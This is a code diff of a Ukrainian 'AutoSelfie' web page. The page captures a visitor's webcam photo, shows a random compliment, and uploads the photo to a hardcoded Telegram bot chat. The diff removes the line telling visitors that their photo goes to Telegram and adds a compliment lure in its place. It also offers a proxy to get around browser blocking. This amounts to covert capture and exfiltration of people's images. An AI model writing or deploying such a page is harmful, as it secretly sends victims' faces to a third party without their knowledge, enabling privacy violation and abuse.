@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
   <meta charset="utf-8" />
-  <title>AutoSelfie → Telegram</title>
+  <title>AutoSelfie → Telegram (рандомне повідомлення + картинка)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root{
@@ -34,21 +34,10 @@
     }
     .caption-area{
       margin:8px 0 14px 0;
-      display:flex;
-      gap:8px;
-      align-items:flex-start;
     }
-    .caption-area textarea{
-      width:100%;
-      min-height:56px;
-      resize:vertical;
-      padding:8px;
-      border-radius:8px;
-      border:1px solid #223;
-      background:#07101a;
-      color:var(--text);
+    .caption-area .static-text{
+      color:var(--muted);
       font-size:14px;
-      box-sizing:border-box;
     }
     .controls{
       display:flex;
@@ -67,7 +56,6 @@
       width:100%;
     }
     button:disabled{opacity:.6;cursor:default}
-    /* Відео: ховаємо поки не активне, але воно рендериться коли показане */
     video{
       width:100%;
       max-width:480px;
@@ -83,6 +71,25 @@
       display:none;
       margin-top:12px;
     }
+    .random-block{
+      margin-top:12px;
+      display:flex;
+      gap:12px;
+      align-items:flex-start;
+    }
+    .random-block img{
+      width:120px;
+      height:120px;
+      object-fit:cover;
+      border-radius:8px;
+      background:#000;
+      border:1px solid #223;
+    }
+    .random-block .msg{
+      color:var(--text);
+      font-size:15px;
+      line-height:1.3;
+    }
     .note{font-size:13px;color:var(--muted);margin-top:10px}
   </style>
 </head>
@@ -93,9 +100,9 @@
       <img id="topImage" src="" alt="Статична картинка">
     </header>
 
-    <!-- Поле для тексту під картинкою -->
+    <!-- Текст під картинкою (статичний) -->
     <div class="caption-area">
-      <textarea id="captionInput" placeholder="Текст під картинкою (підпис, інструкція)"></textarea>
+      <div class="static-text" id="staticText">Тут можна розмістити інструкцію або підпис під картинкою.</div>
     </div>
 
     <!-- Живе відео (показується після дозволу) -->
@@ -104,12 +111,18 @@
     <!-- Відображення знятого фото -->
     <canvas id="canvas"></canvas>
 
+    <!-- Рандомне повідомлення + картинка (після зйомки) -->
+    <div id="randomContainer" class="random-block" style="display:none">
+      <img id="randomImage" src="" alt="Рандомна картинка">
+      <div class="msg" id="randomMessage"></div>
+    </div>
+
     <!-- Кнопка розташована під вікном (відео/canvas) -->
     <div class="controls">
       <button id="actionBtn">Надати доступ до камери</button>
     </div>
 
-    <p class="note">Сторінка працює тільки через HTTPS або localhost. Після зйомки фото відображається на сторінці і відправляється в Telegram з підписом з поля вище.</p>
+    <p class="note">Сторінка працює тільки через HTTPS або localhost. Якщо Telegram блокує запит (CORS), повідом — дам proxy.</p>
   </div>
 
   <script>
@@ -118,16 +131,53 @@
     const CHAT_ID = "1178810140";
     // Статична картинка зверху (URL або data URI). Якщо порожній — картинка прихована.
     const IMAGE_SRC = "";
+    // Статичний текст під картинкою
+    const STATIC_TEXT = "Натисни кнопку, дозволь камеру, потім натисни «Зробити фото». Після зйомки з'явиться випадкове повідомлення з картинкою.";
+    // ====== БАЗА З 12 ПОВІДОМЛЕНЬ І 12 КАРТИНОК ======
+    // Замініть приклади URL на свої реальні зображення або data URI.
+    const RANDOM_MESSAGES = [
+      "Ти виглядаєш чудово сьогодні!",
+      "Нехай цей день принесе тобі удачу.",
+      "Посміхнися — це твоя суперсила.",
+      "Нехай мрії стають реальністю.",
+      "Ти робиш світ кращим своїм виглядом.",
+      "Коротка пауза для натхнення — ти справжній.",
+      "Нехай кожен кадр буде пам'ятним.",
+      "Твоя енергія заряджає навколо.",
+      "Зроби глибокий вдих — і вперед.",
+      "Ти вже на крок ближче до мети.",
+      "Нехай сьогодні буде день сюрпризів.",
+      "Твоя посмішка — найкращий фільтр."
+    ];
+    const RANDOM_IMAGES = [
+      "https://via.placeholder.com/480x480.png?text=Img+1",
+      "https://via.placeholder.com/480x480.png?text=Img+2",
+      "https://via.placeholder.com/480x480.png?text=Img+3",
+      "https://via.placeholder.com/480x480.png?text=Img+4",
+      "https://via.placeholder.com/480x480.png?text=Img+5",
+      "https://via.placeholder.com/480x480.png?text=Img+6",
+      "https://via.placeholder.com/480x480.png?text=Img+7",
+      "https://via.placeholder.com/480x480.png?text=Img+8",
+      "https://via.placeholder.com/480x480.png?text=Img+9",
+      "https://via.placeholder.com/480x480.png?text=Img+10",
+      "https://via.placeholder.com/480x480.png?text=Img+11",
+      "https://via.placeholder.com/480x480.png?text=Img+12"
+    ];
     // ================================================
 
     const actionBtn = document.getElementById('actionBtn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const topImage = document.getElementById('topImage');
-    const captionInput = document.getElementById('captionInput');
+    const staticTextEl = document.getElementById('staticText');
+    const randomContainer = document.getElementById('randomContainer');
+    const randomImageEl = document.getElementById('randomImage');
+    const randomMessageEl = document.getElementById('randomMessage');
 
     if (IMAGE_SRC) topImage.src = IMAGE_SRC;
     else topImage.style.display = "none";
+
+    staticTextEl.textContent = STATIC_TEXT;
 
     let stream = null;
     let cameraActive = false;
@@ -137,14 +187,14 @@
     }
 
     async function stopStream(){
-      if (!stream) return;
-      try { stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn(e); }
+      if (stream) {
+        try { stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn(e); }
+      }
       stream = null;
       video.srcObject = null;
       video.style.display = "none";
     }
 
-    // Чекаємо, поки відео має реальні кадри
     function waitForVideoFrameReady(videoEl, timeout = 4000) {
       return new Promise((resolve, reject) => {
         const start = Date.now();
@@ -177,6 +227,7 @@
         await waitForVideoFrameReady(video, 5000);
         video.style.display = "block";
         canvas.style.display = "none";
+        randomContainer.style.display = "none";
         cameraActive = true;
         actionBtn.textContent = "Зробити фото";
         return true;
@@ -187,6 +238,11 @@
       }
     }
 
+    function pickRandomIndex(){
+      const n = Math.min(RANDOM_MESSAGES.length, RANDOM_IMAGES.length);
+      return Math.floor(Math.random() * n);
+    }
+
     async function takePhotoAndSend(){
       if (!cameraActive) return;
       const w = video.videoWidth || 640;
@@ -195,38 +251,58 @@
       canvas.height = h;
       const ctx = canvas.getContext('2d');
 
-      // Малюємо кадр (можна додати дзеркальне відображення, якщо потрібно)
+      // Малюємо кадр
       ctx.drawImage(video, 0, 0, w, h);
 
       // Показуємо зняте фото
       canvas.style.display = "block";
 
-      // Формуємо blob
+      // Вибираємо випадкове повідомлення і картинку
+      const idx = pickRandomIndex();
+      const message = RANDOM_MESSAGES[idx];
+      const imageUrl = RANDOM_IMAGES[idx];
+
+      // Показуємо на сторінці
+      randomImageEl.src = imageUrl;
+      randomMessageEl.textContent = message;
+      randomContainer.style.display = "flex";
+
+      // Формуємо blob для селфі
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
       if (!blob) {
         alert('Не вдалося сформувати зображення.');
         return;
       }
 
-      // Підпис беремо з поля під картинкою
-      const captionText = captionInput.value || '';
-
-      // Відправка в Telegram (caption додається)
+      // Відправляємо селфі з підписом (рандомне повідомлення)
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
       form.append('photo', blob, 'selfie.png');
-      if (captionText) form.append('caption', captionText);
+      form.append('caption', message);
 
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
       try {
-        const resp = await fetch(url, { method: 'POST', body: form });
-        if (!resp.ok) {
-          const text = await resp.text().catch(()=>'[no body]');
-          console.error('Telegram error', resp.status, text);
-          alert('Відправка неуспішна. Можлива проблема з CORS або токен/чат невірні.');
+        const resp1 = await fetch(sendUrl, { method: 'POST', body: form });
+        if (!resp1.ok) {
+          const text = await resp1.text().catch(()=>'[no body]');
+          console.error('Telegram send selfie error', resp1.status, text);
+          alert('Відправка селфі неуспішна. Можлива проблема з CORS або токен/чат невірні.');
         } else {
-          alert('Фото відправлено в Telegram.');
+          // Додатково надсилаємо картинку з бази як окреме повідомлення (через URL)
+          try {
+            const form2 = new FormData();
+            form2.append('chat_id', CHAT_ID);
+            form2.append('photo', imageUrl); // Telegram приймає URL у полі photo
+            const resp2 = await fetch(sendUrl, { method: 'POST', body: form2 });
+            if (!resp2.ok) {
+              // не критично — просто лог
+              const t = await resp2.text().catch(()=>'[no body]');
+              console.warn('Telegram send random image error', resp2.status, t);
+            }
+          } catch (e2) {
+            console.warn('send random image failed', e2);
+          }
         }
       } catch (err) {
         console.error('send error', err);
@@ -235,23 +311,17 @@
         // Зупиняємо камеру після зйомки
         await stopStream();
         cameraActive = false;
-        // Повертаємо кнопку у стан "Надати доступ..." щоб можна було знову відкрити камеру
         actionBtn.textContent = "Надати доступ до камери";
       }
     }
 
     actionBtn.addEventListener('click', async () => {
       if (!cameraActive) {
-        // Якщо камера не активна — запускаємо її
         await startCamera();
       } else {
-        // Якщо камера активна — робимо фото
         await takePhotoAndSend();
       }
     });
-
-    // При навантаженні сторінки: якщо IMAGE_SRC порожній, залишаємо поле під картинкою видимим (порожнім)
-    // (додаткові налаштування можна змінити у верхніх константах)
   </script>
 </body>
-</html>
+      </html>
